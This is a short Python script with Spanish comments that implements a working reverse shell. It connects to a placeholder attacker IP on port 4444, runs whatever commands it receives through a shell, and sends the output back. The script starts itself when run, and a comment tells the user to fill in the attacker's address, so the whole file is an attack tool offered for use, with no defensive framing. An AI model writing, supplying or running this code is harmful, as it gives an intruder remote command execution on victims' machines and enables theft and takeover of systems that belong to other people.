import socket
import subprocess
import os

# Configuración del servidor atacante
ATTACKER_IP = "000.000.0.000"  # Cambia por la IP del atacante
ATTACKER_PORT = 4444

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))  # Se conecta al atacante

    while True:
        command = s.recv(1024).decode("utf-8")  # Recibe comandos
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):  # Cambiar directorios
            try:
                os.chdir(command[3:])
                s.send(b"Directorio cambiado\n")
            except FileNotFoundError:
                s.send(b"Directorio no encontrado\n")
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)  # Envía la salida del comando

    s.close()

reverse_shell()
